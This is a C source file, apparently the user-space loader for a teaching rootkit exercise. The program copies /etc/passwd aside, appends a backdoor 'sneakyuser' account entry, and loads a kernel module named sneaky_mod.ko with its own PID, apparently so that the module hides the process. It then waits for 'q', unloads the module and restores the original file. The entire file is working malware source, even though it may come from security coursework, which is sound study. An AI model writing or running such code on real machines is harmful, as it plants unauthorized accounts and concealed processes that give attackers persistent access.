#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

void copy_back() {
  FILE *fp_src, *fp_dst;
  if ((fp_src = fopen("/tmp/passwd", "r")) == NULL) {
    printf("Source file open error!!\n");
    exit(EXIT_FAILURE);
  }
  if ((fp_dst = fopen("/etc/passwd", "w")) == NULL) {
    printf("Destination file open error!!\n");
    exit(EXIT_FAILURE);
  }
  while (1) {
    char c = fgetc(fp_src);
    if (c == EOF)
      break;
    fprintf(fp_dst, "%c", c);
  }
  fclose(fp_src);
  fclose(fp_dst);
}

void loop_until_q() {
  printf("start loop...");
  char input;
  while ((input = getchar()) != 'q') {
    // do nothing
  }
}

void remove_sneaky() {
  pid_t pid = fork();
  int wstatus;
  if (pid < 0) {
    perror("fork_remove_module");
    exit(EXIT_FAILURE);
  }
  // child process, execute command
  else if (pid == 0) {
    char *argv[3];
    argv[0] = "rmmod";
    argv[1] = "sneaky_mod.ko";
    argv[2] = NULL;
    execvp(argv[0], argv);
    perror("execvp_remove_module");
    exit(EXIT_FAILURE);
  }
  // parent process
  else {
    do {
      pid_t w = waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
      if (w == -1) {
        perror("waitpid_remove__module");
        exit(EXIT_FAILURE);
      }
      if (WIFEXITED(wstatus)) {
        printf("Program exited with status %d\n", WEXITSTATUS(wstatus));
      } else if (WIFSIGNALED(wstatus)) {
        printf("Program was killed by signal %d\n", WTERMSIG(wstatus));
      }
    } while (!WIFEXITED(wstatus) && !WIFSIGNALED(wstatus));
  }
}

void load_sneaky(int program_pid) {
  pid_t pid = fork();
  int wstatus;
  if (pid < 0) {
    perror("fork_load_module");
    exit(EXIT_FAILURE);
  }
  // child process, execute command
  else if (pid == 0) {
    char trans_str[128] = {'\0'};
    char trans[] = "program_pid=";
    sprintf(trans_str, "%s%d", trans, program_pid);
    char *argv[4];
    argv[0] = "insmod";
    argv[1] = "sneaky_mod.ko";
    argv[2] = trans_str;
    argv[3] = NULL;
    printf("%s %s %s\n", argv[0], argv[1], argv[2]);

    execvp(argv[0], argv);
    perror("execvp_load_module");
    exit(EXIT_FAILURE);
  }
  // parent process
  else {
    do {
      // suspends execution of the calling process until a child specified by
      // pid argument has changed state
      pid_t w = waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
      if (w == -1) {
        perror("waitpid_load_module");
        exit(EXIT_FAILURE);
      }
      if (WIFEXITED(wstatus)) {
        printf("Program exited with status %d\n", WEXITSTATUS(wstatus));
      } else if (WIFSIGNALED(wstatus)) {
        printf("Program was killed by signal %d\n", WTERMSIG(wstatus));
      }
    } while (!WIFEXITED(wstatus) && !WIFSIGNALED(wstatus));
  }
}

void malicious_act() {
  FILE *fp_src, *fp_dst, *fp_add;
  if ((fp_src = fopen("/etc/passwd", "r")) == NULL) {
    printf("Source file open error!!\n");
    exit(EXIT_FAILURE);
  }
  if ((fp_dst = fopen("/tmp/passwd", "w")) == NULL) {
    printf("Destination file open error!!\n");
    exit(EXIT_FAILURE);
  }
  while (1) {
    char c = fgetc(fp_src);
    if (c == EOF)
      break;
    fprintf(fp_dst, "%c", c);
  }
  fclose(fp_src);
  fclose(fp_dst);

  if ((fp_add = fopen("/etc/passwd", "a")) == NULL) {
    printf("Source file (for add) open error!!\n");
    exit(EXIT_FAILURE);
  }
  fprintf(fp_add, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(fp_add);
}

int main() {
  pid_t program_pid = getpid();

  printf("sneaky_process pid = %d\n", program_pid); // 1
  malicious_act();                                  // 2
  load_sneaky(program_pid);                         // 3
  loop_until_q();                                   // 4
  remove_sneaky();                                  // 5
  copy_back();                                      // 6

  return EXIT_SUCCESS;
}
